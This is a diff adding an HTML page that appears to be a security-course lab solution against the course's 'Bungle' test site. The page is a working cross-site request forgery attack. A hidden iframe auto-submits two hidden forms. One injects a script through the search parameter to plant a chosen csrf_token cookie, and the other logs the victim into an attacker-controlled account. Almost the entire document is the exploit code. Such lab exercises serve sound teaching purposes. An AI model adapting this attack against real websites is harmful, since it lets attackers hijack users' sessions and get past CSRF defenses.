@@ -1,0 +1,51 @@
+
+<meta charset='utf-8'>
+
+
+<html>
+<head>
+<title> </title>
+</head>
+<body>
+    
+
+ <form action="http://bungle-cs461.cs.illinois.edu/login?csrfdefense=1&xssdefense=0" method="POST" name="login" target ="frame">
+        <input type="hidden" name="csrf_token" value="94f5fdc0a8b2b47ddb90445c28bc87b3"/>
+        <input type="hidden" name="username" value="attacker"/>
+        <input type="hidden" name="password" value="l33th4x"/>
+
+ </form> 
+
+<form action="http://bungle-cs461.cs.illinois.edu/search?csrfdefense=1&xssdefense=0" method="get" name="token" target="frame">
+       
+    <input type="hidden" name="q" value="<script>document.cookie='csrf_token=94f5fdc0a8b2b47ddb90445c28bc87b3';</script>">
+
+ </form>
+
+ <input type="hidden" name="q" value="<script>document.cookie='csrf_token=94f5fdc0a8b2b47ddb90445c28bc87b3';</script>">
+
+ 
+<iframe src="http://bungle-cs461.cs.illinois.edu/?csrfdefense=1&xssdefense=0" style="display: none;" onload="submit()" name="frame"></iframe>
+
+
+<script type="text/javascript">
+    
+     var number=1; 
+     function submit(){
+     
+    
+     if(number==1){
+     document.token.submit();
+     document.login.submit();}
+     number++;
+ }
+   
+
+</script>
+
+
+</body>
+
+</html>
+
+   
